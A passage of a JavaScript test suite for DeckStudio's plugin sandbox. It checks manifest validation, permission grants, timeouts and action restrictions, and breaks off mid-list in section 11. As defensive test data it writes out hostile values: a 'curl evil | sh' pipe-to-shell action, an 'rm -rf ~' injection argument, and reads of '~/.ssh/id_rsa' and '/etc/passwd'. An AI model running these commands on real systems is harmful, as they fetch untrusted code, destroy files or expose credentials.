// DeckStudio plugin tests. Run: node test/unit/plugins.test.mjs  (scratch DECKSTUDIO_HOME + fake plugin dirs; touches nothing real)
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import http from 'node:http'
import crypto from 'node:crypto'
import { fileURLToPath } from 'node:url'

const SCRATCH = fs.mkdtempSync(path.join(os.tmpdir(), 'deck-plugins-'))
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..')
process.env.DECKSTUDIO_HOME = path.join(SCRATCH, 'home')
process.env.HOME = SCRATCH // never read the real home
const DS = path.join(ROOT, 'src')
const S = await import(path.join(DS, 'plugin-schema.mjs'))
const { PluginHost, runProcess } = await import(path.join(DS, 'plugins.mjs'))
const { BotHub } = await import(path.join(DS, 'bots.mjs'))
const { normalizeProfile } = await import(path.join(DS, 'engine.mjs'))
const { runAction } = await import(path.join(DS, 'actions.mjs'))

let pass = 0, fail = 0
const ok = (cond, name, extra = '') => { if (cond) pass++; else fail++; console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${extra ? '  ' + extra : ''}`) }
const rejects = async (p, re, name) => { try { await p; ok(false, name, '(resolved)') } catch (e) { ok(re.test(e.message), name, `→ ${e.message}`) } }
const sleep = ms => new Promise(r => setTimeout(r, ms))
const until = async (f, ms = 6000) => { const t = Date.now(); while (Date.now() - t < ms) { if (await f()) return true; await sleep(50) } return false }
const alive = pid => { try { process.kill(pid, 0); return true } catch (e) { return e.code === 'EPERM' } }
const base = { deckstudio: 'plugin/v1', version: '1.0.0' }
const V = (m, source = 'user') => S.validateManifest({ ...base, ...m }, { source })

// ---------- 1. manifest validation ----------
{
  const good = V({ id: 'demo', name: 'Demo', detect: { bin: ['$dir/tool'] }, status: { cmd: ['$bin', 'status'], interval: 5 }, values: { pct: '$.a.b[0]' }, actions: { go: { cmd: ['$bin', 'go', '{value}'] } }, permissions: {} })
  ok(good.ok && good.manifest.status.kind === 'cmd' && good.manifest.status.stale === 95, '1a valid manifest normalizes (stale default 95 s)', JSON.stringify(good.errors))
  const bad = [
    [{ id: 'x', deckstudio: 'plugin/v2' }, /plugin\/v1/, 'wrong schema'],
    [{ id: 'Bad Id' }, /id:/, 'bad id'],
    [{ id: 'self' }, /id:/, 'reserved id'],
    [{ id: 'x', status: { cmd: 'echo hi' } }, /shell/, 'shell string without shell permission'],
    [{ id: 'x', status: { cmd: ['/bin/sh', '-c', 'echo hi'] } }, /shell in disguise/, 'interpreter argv without shell permission'],
    [{ id: 'x', status: { cmd: ['env', 'x'] } }, /shell in disguise/, 'env argv without shell permission'],
    [{ id: 'x', status: { http: 'http://example.com/s' } }, /not loopback/, 'non-loopback http undeclared'],
    [{ id: 'x', status: { http: 'http://u:p@127.0.0.1/s' } }, /user info/, 'http with userinfo'],
    [{ id: 'x', status: { file: 'relative/status.json' } }, /path/, 'relative status file'],
    [{ id: 'x', status: { file: '~/../etc/passwd' } }, /path/, '.. in status file'],
    [{ id: 'x', builtin: 'capture' }, /builtin/, 'builtin outside the repo'],
    [{ id: 'x', status: { builtin: 'capture' } }, /built-in/, 'builtin status outside the repo'],
    [{ id: 'x', actions: { go: { cmd: ['$bin'] } } }, /detect\.bin/, '$bin without detect.bin'],
    [{ id: 'x', status: { cmd: ['a'] }, values: { v: 'a.b' } }, /must start with \$/, 'value path without $'],
    [{ id: 'x', status: { cmd: ['a'] }, values: { v: '$..a' } }, /bad path/, 'recursive path rejected'],
    [{ id: 'x', status: { cmd: ['a'] }, values: { _x: '$' } }, /names start/, 'value name starting with _'],
    [{ id: 'x', values: { v: '$' } }, /status source/, 'values without status'],
    [{ id: 'x', actions: { go: { url: 'myapp://x' } } }, /permissions/, 'url scheme undeclared'],
    [{ id: 'x', actions: { go: { url: 'javascript:alert(1)' } } }, /not an openable/, 'javascript: url'],
    [{ id: 'x', actions: { go: { type: 'app', target: '/Applications/X.app' } } }, /bundle/, 'app target not a bundle id'],
    [{ id: 'x', status: { cmd: ['a'], http: 'http://127.0.0.1' } }, /exactly one/, 'two transports'],
    [{ id: 'x', templates: { pages: { p: { name: 'P' } } } }, /needs keys/, 'page template without keys'],
  ]
  for (const [m, re, name] of bad) { const r = V({ name: 'X', ...m }); ok(!r.ok && r.errors.some(e => re.test(e)), `1b rejects: ${name}`, r.errors.join(' | ')) }
  ok(V({ id: 'x', status: { cmd: 'echo hi' }, permissions: { shell: true } }).ok, '1c shell string OK when declared')
  ok(V({ id: 'x', status: { http: 'http://api.example.com/s' }, permissions: { network: ['api.example.com'] } }).ok, '1d non-loopback OK when declared')
  ok(S.validateManifest({ ...base, id: 'cap', builtin: 'capture', actions: { s: { builtin: { type: 'capture', mode: 'screen' } } } }, { source: 'builtin' }).ok, '1e builtin plugin may wrap capture')
  ok(!S.validateManifest({ ...base, id: 'cap', builtin: 'capture', actions: { s: { builtin: { type: 'shell', cmd: 'x' } } } }, { source: 'builtin' }).ok, '1f builtin plugin may not wrap shell')
  ok(!S.validateManifest('{nope', {}).ok && !S.validateManifest([], {}).ok, '1g non-json / non-object')
  const w = V({ id: 'x', bogus: 1, homepage: 'http://x' })
  ok(w.ok && w.warnings.some(x => /bogus/.test(x)) && w.warnings.some(x => /homepage/.test(x)), '1h unknown fields are warnings')
}

// ---------- 2. JSONPath-lite + values ----------
{
  const doc = { a: { b: [10, 20.456, 30] }, 'odd key': 'yes', s: 'hello', n: null, t: true, arr: [{ x: 1 }] }
  const cases = [['$', doc], ['$.a.b[1]', 20.456], ['$.a.b[-1]', 30], ["$['odd key']", 'yes'], ['$["odd key"]', 'yes'], ['$.a.b.length', 3], ['$.s.length', 5], ['$.missing.x', undefined], ['$.arr[0].x', 1], ['$.n', null], ['$.toString', undefined], ['$.__proto__', undefined]]
  for (const [p, want] of cases) ok(JSON.stringify(S.jsonPath(doc, p)) === JSON.stringify(want), `2a jsonPath ${p}`)
  for (const p of ['$.a[*]', '$..a', '$.a[?(@.x)]', 'a.b', '$.a b']) { let t = false; try { S.parsePath(p) } catch { t = true } ok(t, `2b rejects path ${p}`) }
  const m = V({ id: 'v', status: { cmd: ['a'] }, values: { pct: { path: '$.a.b[1]', round: 1 }, flag: { path: '$.t', map: { true: 'on' } }, miss: { path: '$.zz', default: '—', stale: 'off' }, obj: '$.arr' } }).manifest
  const v = S.extractValues(m, doc)
  ok(v.pct === '20.5' && v.flag === 'on' && v.miss === '—' && v.obj === '[{"x":1}]', '2c values: round, map, default, objects as json', JSON.stringify(v))
  const st = S.extractValues(m, doc, { stale: true })
  ok(st.miss === 'off' && st.pct === '', '2d stale values: stale → default → empty', JSON.stringify(st))
  const auto = V({ id: 'w', status: { cmd: ['a'] } }).manifest
  ok(S.extractValues(auto, 'idle').status === 'idle' && S.extractValues(auto, { state: 'busy' }).status === 'busy' && S.extractValues(auto, { status: 'x' }).status === 'x', '2e no values: {id.status} from text / state / status')
  ok(S.parseStatus('{"a":1}').a === 1 && S.parseStatus('word\nmore') === 'word', '2f parseStatus auto: json else first line')
  let threw = false; try { S.parseStatus('nope', 'json') } catch { threw = true }
  ok(threw, '2g parse: json rejects text')
  const vars = S.pluginVars('my-tool', { pct: '5' }, 'ok')
  ok(vars['my-tool.pct'] === '5' && vars['my-tool._state'] === 'ok', '2h pluginVars names {id.value}')
  const filled = 'x {my-tool.pct}% {page} {nope.x} {a b}'.replace(S.VAR_RE, (mm, k) => ({ ...vars, page: 'home' })[k] ?? mm)
  ok(filled === 'x 5% home {nope.x} {a b}', '2i VAR_RE templates {id.value} next to {page}', filled)
}

// ---------- 3. trust / grants / templates → recipes ----------
{
  const m = V({ id: 't', name: 'Tool', status: { cmd: 'x' }, permissions: { shell: true, schemes: ['myapp'], network: ['api.x.com'] }, templates: { keys: { k: { title: 'K', template: { label: '{self.v}', onPress: { type: 'plugin', action: 'go' } } } }, pages: { p: { keys: [{ onPress: { type: 'plugin', action: 'go' } }] } } } }).manifest
  ok(!S.pluginTrust({}, m).enabled, '3a user plugins start off')
  ok(S.pluginTrust({}, { ...m, source: 'builtin' }).enabled && S.pluginTrust({}, { ...m, source: 'local' }).enabled, '3b builtin / local start on')
  const t = S.pluginTrust({ t: { enabled: true, grants: { shell: true, schemes: ['myapp', 'evil'], network: ['other.com'] } } }, m)
  ok(t.enabled && t.grants.shell && t.grants.schemes.join() === 'myapp' && !t.grants.network.length, '3c grants = declared ∩ granted', JSON.stringify(t))
  ok(S.missingGrants(m, t).network.join() === 'api.x.com', '3d missingGrants')
  let threw = false; try { S.checkGrant(m, { schemes: ['other'] }) } catch { threw = true }
  ok(threw && S.checkGrant(m, { shell: true }).shell, '3e checkGrant: only what the manifest declares')
  ok(S.cmdAllowed('echo', {}) && !S.cmdAllowed('echo', { shell: true }) && !S.cmdAllowed(['/usr/bin/true'], {}) && S.cmdAllowed(['/bin/zsh', '-c', 'x'], {}), '3f cmdAllowed')
  ok(!S.httpAllowed('http://127.0.0.1:9/x', {}) && !S.httpAllowed('http://localhost/x', {}) && S.httpAllowed('http://example.com', {}) && !S.httpAllowed('https://api.x.com/a', { network: ['api.x.com'] }), '3g httpAllowed')
  ok(!S.urlAllowed('https://x', {}) && S.urlAllowed('myapp://x', {}) && !S.urlAllowed('myapp://x', { schemes: ['myapp'] }) && S.urlAllowed('file:///etc', { schemes: ['file'] }), '3h urlAllowed')
  const rs = S.pluginRecipes(m)
  const k = rs.find(r => r.where === 'key'), p = rs.find(r => r.where === 'page')
  ok(rs.length === 2 && k.id === 'plugin-t-k' && k.template.label === '{t.v}' && k.template.onPress.plugin === 't' && k.template.plugin === 't' && p.template.keys[0].onPress.plugin === 't' && !p.template.plugin, '3i templates → recipes, {self.} and plugin bound', JSON.stringify(k.template))
  const ids = S.referencedPlugins({ keys: [{ title: '{ante-x.status}', onPress: { type: 'plugin', plugin: 'foo', action: 'a' } }, { label: '{page}' }] })
  ok(ids.has('ante-x') && ids.has('foo') && ids.size === 2, '3j referencedPlugins')
  const clean = S.cleanPluginsConfig({ good: { enabled: true, grants: { shell: 'yes', schemes: ['A', 3], network: 'x' }, extra: 1 }, 'Bad id': {}, nope: 5 })
  ok(JSON.stringify(clean) === JSON.stringify({ good: { enabled: true, grants: { shell: false, schemes: ['a'], network: [] } } }), '3k cleanPluginsConfig', JSON.stringify(clean))
  const prof = normalizeProfile({ pages: { a: {} }, plugins: { x: { enabled: false, grants: { shell: true, evil: 1 } }, 'b d': {} } })
  ok(JSON.stringify(prof.plugins) === '{"x":{"enabled":false,"grants":{"shell":true,"schemes":[],"network":[]}}}', '3l normalizeProfile sanitizes plugins', JSON.stringify(prof.plugins))
  ok(!('plugins' in normalizeProfile({ pages: { a: {} } })), '3m older profiles stay without plugins')
}

// ---------- 4. the host: fake plugin dirs ----------
const DIRS = { builtin: path.join(SCRATCH, 'builtin'), local: path.join(SCRATCH, 'builtin/local'), user: path.join(SCRATCH, 'home/plugins') }
const mk = (where, id, manifest, files = {}) => {
  const dir = path.join(DIRS[where], id)
  fs.mkdirSync(dir, { recursive: true })
  fs.writeFileSync(path.join(dir, 'deckstudio.json'), typeof manifest === 'string' ? manifest : JSON.stringify({ ...base, id, name: id, ...manifest }))
  for (const [f, c] of Object.entries(files)) { fs.writeFileSync(path.join(dir, f), c); if (f.endsWith('.sh') || f === 'tool') fs.chmodSync(path.join(dir, f), 0o755) }
  return dir
}
// a local http status server
let hits = 0
const srv = http.createServer((req, res) => {
  hits++
  if (req.url === '/redirect') { res.writeHead(302, { location: 'http://example.com/' }); return res.end() }
  if (req.url === '/big') { res.writeHead(200); return res.end('x'.repeat(2 << 20)) }
  if (req.url === '/act' && req.method === 'POST') { let b = ''; req.on('data', d => b += d); req.on('end', () => { srv.lastBody = b; res.end('ok') }); return }
  res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify({ temp: 21.5, state: 'warm', updated_at: new Date().toISOString() }))
})
await new Promise(r => srv.listen(0, '127.0.0.1', r))
const PORT = srv.address().port

const statusFile = path.join(SCRATCH, 'status.json')
fs.writeFileSync(statusFile, JSON.stringify({ state: 'ready', count: 3, updated_at: new Date().toISOString() }))
mk('user', 'cmdy', {
  detect: { bin: ['$dir/tool'] }, status: { cmd: ['$bin', 'status'], interval: 1 }, values: { pct: '$.pct', mode: { path: '$.mode', map: { a: 'alpha' } } },
  actions: { write: { cmd: ['$dir/write.sh', 'v={value}', 'p={page}', '{cmdy.pct}', '{label}'], params: ['label'] }, fail: { cmd: ['$dir/fail.sh'] }, app: { type: 'app', target: 'bundle' }, link: { url: 'myapp://go?x={value}' }, web: { url: 'https://example.com/{value}' }, post: { http: `http://127.0.0.1:${PORT}/act`, body: { v: '{value}' } } },
  detect2: 1, permissions: { schemes: ['myapp'] },
}, {
  tool: '#!/bin/sh\necho \'{"pct": 42, "mode": "a"}\'\n',
  'write.sh': `#!/bin/sh\nprintf '%s\\n' "$@" > "$DECK_PLUGIN_DIR/out.txt"\necho "value=$DECK_VALUE" >> "$DECK_PLUGIN_DIR/out.txt"\n`,
  'fail.sh': '#!/bin/sh\necho boom >&2\nexit 3\n',
})
// detect.bundle too, for the app action
const cmdyM = JSON.parse(fs.readFileSync(path.join(DIRS.user, 'cmdy/deckstudio.json')))
cmdyM.detect.bundle = 'com.example.cmdy'; delete cmdyM.detect2
fs.writeFileSync(path.join(DIRS.user, 'cmdy/deckstudio.json'), JSON.stringify(cmdyM))
mk('user', 'httpy', { status: { http: `http://127.0.0.1:${PORT}/s`, interval: 1 }, values: { temp: { path: '$.temp', round: 0 }, state: '$.state' } })
mk('user', 'filey', { status: { file: statusFile, interval: 1, stale: 2 }, values: { state: '$.state', count: '$.count' } })
mk('user', 'shelly', { status: { cmd: 'echo "$DECK_PLUGIN"', interval: 1 }, permissions: { shell: true } })
mk('user', 'slowy', { status: { cmd: ['$dir/slow.sh'], interval: 1, timeout: 1 } }, { 'slow.sh': '#!/bin/sh\nsleep 30 &\necho $! > "$DECK_PLUGIN_DIR/child.pid"\necho $$ > "$DECK_PLUGIN_DIR/parent.pid"\nsleep 30\n' })
mk('user', 'netty', { status: { http: 'http://api.example.invalid/s', interval: 1 }, permissions: { network: ['api.example.invalid'] } })
mk('user', 'redir', { status: { http: `http://127.0.0.1:${PORT}/redirect`, interval: 1 } })
mk('user', 'bigly', { status: { http: `http://127.0.0.1:${PORT}/big`, interval: 1 } })
mk('user', 'secret', { status: { file: '~/.ssh/id_rsa', interval: 1 } })
mk('user', 'missing', { detect: { bin: ['/nonexistent/tool'], bundle: 'com.example.nothere' }, install: { brew: 'missing-tool' }, actions: { go: { cmd: ['/nonexistent/tool'] } } })
mk('user', 'botty', { bots: { cmd: ['$dir/bots.sh'], interval: 1 }, permissions: { schemes: ['botapp'] } }, { 'bots.sh': '#!/bin/sh\necho \'{"name":"Botty","schemes":["botapp"],"bots":[{"id":"a","name":"Alpha","awaiting":true,"open":{"type":"url","url":"botapp://a"}},{"id":"b","name":"Beta","open":{"type":"shell","cmd":"echo hi"}}]}\'\n' })
mk('user', 'broken', '{ not json')
mk('user', 'badid', { id: 'Bad!' })
mk('builtin', 'cap', { builtin: 'capture', status: { builtin: 'capture', interval: 1 }, values: { rec: '$.recording' }, actions: { shot: { builtin: { type: 'capture', mode: 'screen' }, params: ['delay'] } } })
mk('local', 'loco', { detect: { bin: ['/bin/echo'] }, status: { cmd: ['$bin', 'local-ok'], interval: 1 } })
mk('user', 'cap', { status: { cmd: ['/bin/echo', 'impostor'] } }) // duplicate of the builtin id
const devDir = path.join(SCRATCH, 'dev/linky'); fs.mkdirSync(devDir, { recursive: true })
fs.writeFileSync(path.join(devDir, 'deckstudio.json'), JSON.stringify({ ...base, id: 'linky', name: 'Linky', detect: { bin: ['/bin/echo'] }, status: { cmd: ['/bin/echo', 'linked'], interval: 1 } }))
fs.symlinkSync(devDir, path.join(DIRS.user, 'linky'))

const cfg = { cmdy: { enabled: true }, httpy: { enabled: true }, filey: { enabled: true }, shelly: { enabled: true }, slowy: { enabled: true }, netty: { enabled: true }, redir: { enabled: true }, bigly: { enabled: true }, secret: { enabled: true }, missing: { enabled: true }, botty: { enabled: true }, linky: { enabled: true } }
// the user approved each enabled plugin's current manifest (POST /api/plugins/:id/enable records its sha256; see section 12)
const shas = new Map()
const shaOf = id => {
  const f = path.join(DIRS.user, id, 'deckstudio.json')
  try { const k = `${f}:${fs.statSync(f).mtimeMs}`; if (!shas.has(k)) shas.set(k, crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex')); return shas.get(k) } catch { return undefined }
}
const approved = c => Object.fromEntries(Object.entries(c).map(([id, v]) => [id, v.enabled && !v.approved ? { ...v, approved: shaOf(id) } : v]))
const ran = [], botFeed = new Map()
let changes = 0
const host = new PluginHost({
  dirs: DIRS, cfg: () => approved(cfg), onChange: () => changes++,
  runAction: async (a, ctx) => { ran.push({ a, ctx }); return { ok: true } },
  bundles: async ids => Object.fromEntries(ids.map(i => [i, i === 'com.example.cmdy'])),
  builtins: { capture: () => ({ recording: 'on', rec_time: '0:05' }) },
  onBots: (id, e) => (e ? botFeed.set(id, e) : botFeed.delete(id)),
})
host.focus(['cmdy', 'httpy', 'filey', 'shelly', 'slowy', 'netty', 'redir', 'bigly', 'secret', 'cap', 'loco', 'linky', 'botty'])
host.start()
const P = id => host.summary().plugins.find(p => p.id === id && p.valid !== false) || host.summary().plugins.find(p => p.id === id)
await until(() => P('cmdy')?.state === 'ok' && P('httpy')?.state === 'ok' && P('filey')?.state === 'ok' && P('loco')?.state === 'ok')

{
  const sum = host.summary().plugins
  ok(P('cmdy').state === 'ok' && P('cmdy').values.pct === '42' && P('cmdy').values.mode === 'alpha', '4a cmd status (argv via $bin) → values', JSON.stringify(P('cmdy').values))
  const vars = host.vars()
  ok(vars['cmdy.pct'] === '42' && vars['cmdy._state'] === 'ok' && vars['missing._state'] === 'missing', '4b values → template vars', JSON.stringify(vars).slice(0, 200))
  ok(P('httpy').values.temp === '22' && P('httpy').values.state === 'warm', '4c http status on 127.0.0.1', JSON.stringify(P('httpy')))
  ok(P('filey').values.state === 'ready' && P('filey').values.count === '3', '4d file status')
  ok(sum.find(p => p.id === 'broken' && p.state === 'invalid' && /not json/.test(p.errors[0])), '4e unparsable manifest listed as invalid')
  ok(sum.find(p => p.id === 'badid' && p.state === 'invalid'), '4f bad id listed as invalid')
  const caps = sum.filter(p => p.id === 'cap')
  ok(caps.length === 2 && caps[0].source === 'builtin' && caps[0].valid && /duplicate/.test(caps[1].errors[0]), '4g duplicate id: built-in wins, the other is listed', JSON.stringify(caps.map(c => [c.source, c.errors])))
  ok(P('cap').state === 'ok' && P('cap').values.rec === 'on', '4h built-in status source')
  ok(P('loco').source === 'local' && P('loco').enabled && P('loco').values.status === 'local-ok', '4i local plugins on by default, text status → {id.status}')
  ok(P('linky').source === 'linked' && P('linky').dir === fs.realpathSync(devDir) && P('linky').values.status === 'linked', '4j symlinked dev dir = linked plugin')
  ok(P('missing').installed === false && P('missing').state === 'missing', '4k detect: missing bin + bundle → missing')
  ok(P('cmdy').installed && P('cmdy').app === 'com.example.cmdy' && P('cmdy').bin.endsWith('/cmdy/tool'), '4l detect: bin + bundle resolved')
  ok(P('shelly').state === 'error' && /shell commands are off/.test(P('shelly').error), '4m permission denial: shell string without the grant', P('shelly').error)
  ok(P('netty').state === 'error' && /isn't allowed/.test(P('netty').error), '4n permission denial: non-loopback http without the grant', P('netty').error)
  ok(P('redir').state === 'error' && /302/.test(P('redir').error), '4o http redirects are not followed', P('redir').error)
  ok(P('bigly').state === 'error' && /over/.test(P('bigly').error), '4p http body capped at 1 MB', P('bigly').error)
  ok(P('secret').state === 'error' && /missing|off limits/.test(P('secret').error), '4q status file under ~/.ssh refused', P('secret').error)
}

// grants take effect without a restart
cfg.shelly.grants = { shell: true }
host.sync()
await until(() => P('shelly').state === 'ok')
ok(P('shelly').values.status === 'shelly', '4r granting shell: the shell status runs (env DECK_PLUGIN)', JSON.stringify(P('shelly')))
cfg.netty.grants = { network: ['api.example.invalid'] }
host.sync()
await until(() => P('netty').error && !/isn't allowed/.test(P('netty').error))
ok(!/isn't allowed/.test(P('netty').error || ''), '4s granting network: the fetch is attempted', P('netty').error)

// ---------- 5. timeout kills the whole process group; disabling kills in-flight runs ----------
{
  const dir = path.join(DIRS.user, 'slowy')
  await until(() => /timed out/.test(P('slowy').error || ''), 5000)
  ok(/timed out after 1 s/.test(P('slowy').error), '5a status command timeout reported', P('slowy').error)
  await until(() => fs.existsSync(path.join(dir, 'child.pid')))
  await sleep(100) // a run is in flight now (interval 1 s, it sleeps 30)
  const pids = () => [Number(fs.readFileSync(path.join(dir, 'parent.pid'), 'utf8')), Number(fs.readFileSync(path.join(dir, 'child.pid'), 'utf8'))]
  const [p1, c1] = pids()
  cfg.slowy.enabled = false; host.sync()
  await sleep(200)
  ok(p1 && c1 && !alive(p1) && !alive(c1), '5b disabling kills the in-flight run and its background child', `${p1}:${alive(p1)} ${c1}:${alive(c1)}`)
  const t0 = Date.now()
  const pf = path.join(SCRATCH, 'pg.pids')
  const r = await runProcess('/bin/sh', ['-c', `sleep 20 & echo $! > ${pf}; echo $$ >> ${pf}; sleep 20`], { timeout: 500 })
  await sleep(100)
  const [c2, p2] = fs.readFileSync(pf, 'utf8').trim().split('\n').map(Number)
  ok(!r.ok && /timed out/.test(r.why) && Date.now() - t0 < 3000 && !alive(c2) && !alive(p2), '5c timeout kills the process group (shell + background child), returns promptly', `${Date.now() - t0} ms ${alive(p2)} ${alive(c2)}`)
}

// ---------- 6. stale / heartbeat ----------
{
  fs.writeFileSync(statusFile, JSON.stringify({ state: 'ready', count: 3, updated_at: new Date(Date.now() - 60e3).toISOString() }))
  await until(() => P('filey').state === 'stale', 4000)
  ok(P('filey').state === 'stale' && P('filey').values.state === '', '6a old heartbeat (updated_at) → stale, values blanked', JSON.stringify(P('filey')))
  fs.writeFileSync(statusFile, JSON.stringify({ state: 'busy', count: 1, updated_at: new Date().toISOString() }))
  await until(() => P('filey').state === 'ok', 4000)
  ok(P('filey').values.state === 'busy', '6b fresh heartbeat → ok again')
  fs.writeFileSync(statusFile, JSON.stringify({ state: 'busy', pid: 999999, running: true }))
  await until(() => P('filey').state === 'stale', 4000)
  ok(P('filey').state === 'stale', '6c a dead pid → stale')
  fs.writeFileSync(statusFile, JSON.stringify({ state: 'quiet' }))
  const old = (Date.now() - 10e3) / 1000; fs.utimesSync(statusFile, old, old)
  await until(() => P('filey').values.state === '' && P('filey').state === 'stale', 4000)
  ok(P('filey').state === 'stale', '6d no heartbeat field: file mtime older than stale → stale')
  fs.writeFileSync(statusFile, JSON.stringify({ state: 'quiet', stale: true }))
  await until(() => P('filey').state === 'stale' && fs.statSync(statusFile).mtimeMs > Date.now() - 5000, 4000)
  ok(P('filey').state === 'stale', '6e doc says stale: true → stale')
  fs.rmSync(statusFile)
  await until(() => P('filey').state === 'stopped', 4000)
  ok(P('filey').state === 'stopped' && !P('filey').error && P('filey').values.state === '', '6f file removed → stopped (tool not running), values back at defaults')
}

// ---------- 7. actions ----------
{
  const dir = path.join(DIRS.user, 'cmdy')
  const engine = { toast: () => {}, notify: () => {} }
  await host.run({ type: 'plugin', plugin: 'cmdy', action: 'write', args: { label: 'a b; rm -rf ~', evil: 'x' } }, { engine, vars: { value: '7', page: 'home' } })
  const out = fs.readFileSync(path.join(dir, 'out.txt'), 'utf8').trim().split('\n')
  ok(out[0] === 'v=7' && out[1] === 'p=home' && out[2] === '42' && out[3] === 'a b; rm -rf ~' && out[4] === 'value=7', '7a argv action: {value} {page} {id.value} {param} filled, no shell parsing, env DECK_VALUE', JSON.stringify(out))
  const r = await host.run({ type: 'plugin', plugin: 'cmdy', action: 'fail' }, { engine })
  ok(r.ok === false && r.stderr === 'boom', '7b failing command → { ok: false, stderr } (logged ✗ by the engine)', JSON.stringify(r))
  await host.run({ plugin: 'cmdy', action: 'app' }, { engine })
  ok(ran.at(-1).a.type === 'app' && ran.at(-1).a.target === 'com.example.cmdy', '7c app action → the detected bundle via the action runner')
  await rejects(host.run({ plugin: 'cmdy', action: 'link', args: {} }, { engine, vars: { value: '1' } }), /myapp: links are off/, '7d undeclared-grant scheme blocked')
  await rejects(host.run({ plugin: 'cmdy', action: 'nope' }, { engine }), /no action "nope"/, '7e unknown action')
  await rejects(host.run({ plugin: 'zzz', action: 'x' }, { engine }), /no plugin/, '7f unknown plugin')
  await rejects(host.run({ plugin: 'missing', action: 'go' }, { engine }), /isn't installed \(brew install missing-tool\)/, '7g not installed → install hint')
  await rejects(host.run({ plugin: 'broken', action: 'x' }, { engine }), /no plugin/, '7h invalid plugins have no actions')
  cfg.cmdy.enabled = false
  await rejects(host.run({ plugin: 'cmdy', action: 'write' }, { engine }), /is off/, '7i disabled plugin refuses actions')
  host.sync()
  ok(host.vars()['cmdy._state'] === 'disabled' && host.vars()['cmdy.pct'] === undefined, '7j disabled: values gone, state disabled')
  cfg.cmdy.enabled = true; host.sync()
  await host.run({ plugin: 'cap', action: 'shot', args: { delay: '{value}', to: 'clipboard' } }, { engine, vars: { value: 3 } })
  ok(ran.at(-1).a.type === 'capture' && ran.at(-1).a.mode === 'screen' && ran.at(-1).a.delay === '3' && !('to' in ran.at(-1).a), '7k builtin action: declared params only, templated', JSON.stringify(ran.at(-1).a))
  await host.run({ plugin: 'cmdy', action: 'post' }, { engine, vars: { value: 'a"b' } })
  ok(JSON.parse(srv.lastBody).v === 'a"b', '7l http action posts a json-escaped body', srv.lastBody)
  const before = hits
  cfg.cmdy.grants = { schemes: ['myapp'] }; host.sync()
  // actions → the engine's runner: { type: plugin } through actions.mjs
  const eng = { live: { plugins: host }, notify: () => {}, toast: () => {} }
  await runAction({ type: 'plugin', plugin: 'cmdy', action: 'write', args: { label: 'via-runner' } }, { engine: eng, vars: { value: '9', page: 'p' } })
  ok(fs.readFileSync(path.join(dir, 'out.txt'), 'utf8').includes('via-runner'), '7m actions.mjs dispatches type "plugin" to the host')
  ok(hits >= before, '7n (http server reachable)')
}

// ---------- 8. bots from a plugin ----------
{
  await until(() => botFeed.get('botty')?.doc)
  const e = botFeed.get('botty')
  ok(e && e.doc.bots.length === 2 && e.trust.schemes.length === 0, '8a bots transport feeds the hub (no grants yet)')
  const hub = new BotHub(); hub.cfg = () => []
  hub.setPlugin('botty', e)
  const all = hub.all()
  ok(all.length === 2 && all[0].key === 'botty:a', '8b plugin bots listed under the plugin id')
  ok(hub.press(all[0]).blocked && hub.press(all[1]).blocked, '8c without grants: botapp: links and shell blocked')
  hub.setPlugin('botty', { ...e, trust: { schemes: ['botapp'], allowShell: false } })
  ok(!hub.press(hub.all()[0]).blocked && hub.press(hub.all()[1]).blocked, '8d granted scheme opens; shell still needs the shell grant')
  ok(hub.providers().find(p => p.id === 'botty')?.kind === 'plugin', '8e provider listed as kind plugin')
  hub.setPlugin('grokbot', e)
  ok(!hub.all().some(b => b.provider === 'grokbot'), '8f a plugin cannot impersonate grokbot')
  cfg.botty.enabled = false; host.sync()
  ok(!botFeed.has('botty'), '8g disabling the plugin drops its bots')
}

// ---------- 9. focus: only shown plugins poll fast ----------
{
  host.focus(['cmdy'])
  const r = host.plugins.get('httpy')
  ok(host.delay(host.plugins.get('cmdy'), host.plugins.get('cmdy').m.status) === 1000 && host.delay(r, r.m.status) === 30000, '9a not on the page: polled every 30 s at most')
}

// ---------- 10. the shipped manifests ----------
{
  const root = path.dirname(DS)
  for (const id of fs.readdirSync(path.join(root, 'plugins')).filter(n => n !== 'local')) {
    const r = S.validateManifest(fs.readFileSync(path.join(root, 'plugins', id, 'deckstudio.json'), 'utf8'), { source: 'builtin' })
    ok(r.ok && !r.warnings.length, `10 built-in plugin ${id} validates`, [...r.errors, ...r.warnings].join(' | '))
  }
  const locals = path.join(root, 'plugins/local')
  for (const id of fs.existsSync(locals) ? fs.readdirSync(locals) : []) {
    const r = S.validateManifest(fs.readFileSync(path.join(locals, id, 'deckstudio.json'), 'utf8'), { source: 'local' })
    ok(r.ok && !r.warnings.length, `10 local plugin ${id} validates`, [...r.errors, ...r.warnings].join(' | '))
  }
  const schema = JSON.parse(fs.readFileSync(path.join(root, 'docs/plugin.schema.json'), 'utf8'))
  ok(schema.properties?.deckstudio && schema.required?.includes('id'), '10 docs/plugin.schema.json parses')
}

// ---------- 11. H1: templates carry only presentation + this plugin's actions (+ page / back / none) ----------
{
  const T = (template, extra = {}) => V({ id: 'tp', name: 'Tp', actions: { go: { cmd: ['$dir/go'] } }, templates: { keys: { k: { template } } }, ...extra })
  const bad = [
    [{ onPress: { type: 'shell', cmd: 'curl evil | sh' } }, 'shell action'],
    [{ onPress: { type: 'applescript', script: 'x' } }, 'applescript action'],
    [{ onPress: { type: 'keys', combo: 'cmd+q' } }, 'keys action'],
    [{ onRelease: { type: 'hold-keys', combo: 'fn' } }, 'hold-keys action'],
    [{ onPress: { type: 'type', text: 'x' } }, 'type action'],
    [{ onPress: { type: 'http', url: 'https://x' } }, 'http action'],
    [{ onPress: { type: 'shortcut', name: 'x' } }, 'shortcut action'],
    [{ onPress: { type: 'open', target: '/Applications/Calculator.app' } }, 'open of a path'],
    [{ onPress: { type: 'open', target: 'https://example.com' } }, 'open (even https: not a plugin action)'],
    [{ onPress: { type: 'app', target: 'com.apple.Terminal' } }, 'app action'],
    [{ poll: { cmd: 'id', interval: 1 } }, 'poll.cmd'],
    [{ browse: { cmd: 'ls' } }, 'browse.cmd'],
    [{ onPress: { type: 'multi', actions: [{ type: 'page', page: 'x' }, { type: 'applescript', script: 'x' }] } }, 'multi hiding applescript'],
    [{ onPress: { type: 'plugin', plugin: 'capture', action: 'screen' } }, "another plugin's action"],
    [{ _press: { type: 'plugin', plugin: 'capture', action: 'record', args: { audio: true } } }, '_press (runs before onPress, unchecked)'],
